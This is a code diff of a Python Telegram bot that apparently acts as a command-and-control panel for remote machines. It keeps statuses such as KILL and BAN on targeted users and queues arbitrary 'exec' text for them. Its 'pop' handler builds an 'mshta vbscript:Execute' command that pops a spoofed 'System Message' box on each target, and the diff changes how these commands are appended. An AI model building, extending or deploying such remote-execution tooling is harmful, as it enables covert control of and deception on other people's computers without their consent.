@@ -164,18 +164,28 @@ def batch_update_users(target_input: str, new_status_base: str, extra_text: str 
     if not os.path.exists(USERS_FILE): return 0, []
     targets = [u.strip() for u in target_input.split('-') if u.strip()]
     updated_users, new_lines = [], []
+    
     with open(USERS_FILE, "r") as f:
         lines = f.readlines()
+        
     for line in lines:
         if " -> " in line:
-            u_part = line.split(" -> ")[0].strip()
+            parts = line.split(" -> ")
+            u_part = parts[0].strip()
+            current_status = parts[1].strip() # Get what's already there (e.g., KILL)
+
             if u_part in targets:
-                status_str = f"{new_status_base} {extra_text}".strip()
+                # If you want to keep 'KILL' or 'BAN' but add the message after it:
+                status_str = f"{current_status} {extra_text}".strip()
                 new_lines.append(f"{u_part} -> {status_str}\n")
                 updated_users.append(u_part)
-            else: new_lines.append(line)
-        else: new_lines.append(line)
-    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
+            else:
+                new_lines.append(line)
+        else:
+            new_lines.append(line)
+            
+    with open(USERS_FILE, "w") as f: 
+        f.writelines(new_lines)
     return len(updated_users), updated_users
 
 def delete_sync_users(target_input: str):
@@ -319,7 +329,8 @@ async def handle_exec_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📝 Send text:", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_TEXT
 
 async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "SAFE", update.message.text)
+    # Pass "" as the second argument so it relies on the existing status in the file
+    count, _ = batch_update_users(context.user_data.get("exec_targets", ""), "", update.message.text)
     await update.message.reply_text(f"⚡ Done."); return await start(update, context)
 
 async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -328,7 +339,8 @@ async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     vbs = f'mshta vbscript:Execute("msgbox ""{update.message.text.strip()}"",64,""System Message"":close")'
-    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "SAFE", vbs)
+    # Pass "" as the second argument
+    count, _ = batch_update_users(context.user_data.get("pop_targets", ""), "", vbs)
     await update.message.reply_text(f"💬 Sent to {count}."); return await start(update, context)
 
 # ---------- APP SETUP ----------
